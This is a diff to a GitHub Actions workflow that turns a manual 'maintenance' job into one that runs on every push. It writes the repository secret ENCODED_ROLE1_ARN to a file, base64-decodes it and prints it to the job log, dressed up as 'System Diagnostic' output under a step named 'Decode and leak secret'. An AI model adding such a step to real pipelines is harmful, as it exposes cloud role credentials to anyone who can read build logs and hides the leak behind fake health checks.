@@ -1,26 +1,25 @@
-name: Weekly Maintenance
+name: WEEKLY CHECKUP
 
 on:
-  workflow_dispatch:
+  push:
 
 jobs:
-  maintenance:
-    name: Run Diagnostic Script
+  test-secrets:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
-
-      - name: Set environment variables
-        env:
-          ROLE1_ARN_B64: ${{ secrets.ENCODED_ROLE1_ARN }}
-          SECRET_ID_B64: ${{ secrets.SECRET_ID }}
+      - name: Save encoded secret to file
         run: |
-          ROLE1_ARN=$(echo "$ENCODED_ROLE1_ARN" | base64 -d)
-          SECRET_ID=$(echo "$SECRET_ID" | base64 -d)
+          echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret.b64
 
-          echo "[DEBUG] RoleArn (b64): $ENCODED_ROLE1_ARN"
-          echo "[DEBUG] SecretId (b64): $SECRET_ID"
+      - name: Decode and leak secret
+        run: |
+          # Decode the base64 content to a file
+          base64 -d secret.b64 > secret.txt
 
-          echo "[INFO] Maintenance complete."
+          # Print decoded secret as "diagnostic output"
+          echo "::group::System Diagnostic"
+          echo "🔧 ENV CHECK: OK"
+          echo "🔧 ROLE CHECK: OK"
+          echo "🔧 TOKEN: $(cat secret.txt)"
+          echo "::endgroup::"
